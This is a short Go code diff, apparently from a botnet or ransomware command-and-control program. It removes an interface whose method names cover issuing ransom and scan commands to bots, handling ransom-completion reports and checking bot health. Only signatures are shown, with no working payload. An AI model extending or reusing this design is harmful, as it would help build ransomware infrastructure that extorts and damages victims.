@@ -14,17 +14,3 @@ type CommandControl struct {
 func (c *CommandControl) Addr() string {
 	return fmt.Sprintf("%s:%s", c.Host, c.Port)
 }
-
-//Commander is
-type Commander interface {
-	Listen()
-
-	RansomCmd(addr string) error
-	ScanCmd(addr string) error
-
-	HandleGenesis(payload []byte)
-	HandleRansomComplete(payload []byte)
-	HandleScanResponse(payload []byte)
-
-	CheckBotHealth(bot *Bot) error
-}
